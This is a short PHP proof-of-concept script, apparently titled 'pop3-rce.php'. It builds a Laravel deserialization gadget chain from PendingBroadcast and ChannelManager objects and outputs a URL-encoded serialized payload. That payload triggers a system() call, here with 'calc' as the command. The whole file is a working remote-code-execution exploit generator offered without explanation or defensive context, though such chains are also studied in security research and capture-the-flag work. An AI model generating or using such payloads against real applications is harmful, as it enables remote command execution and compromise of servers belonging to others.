<?php
/*
# -*- coding: utf-8 -*-
# @filename: pop3-rce.php
# @author: diggid
*/

namespace Illuminate\Notifications{
    //use Illuminate\Support\Manager;
    class ChannelManager{
        protected $customCreators = array("diggid" => "system");
        protected $container = "calc";
        protected $drivers = array(); //should not have key "diggid"
        protected $defaultChannel = "diggid";
    }
}

namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace {
    $b = new Illuminate\Notifications\ChannelManager;
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, "diggid");
    echo urlencode(serialize($a));
}
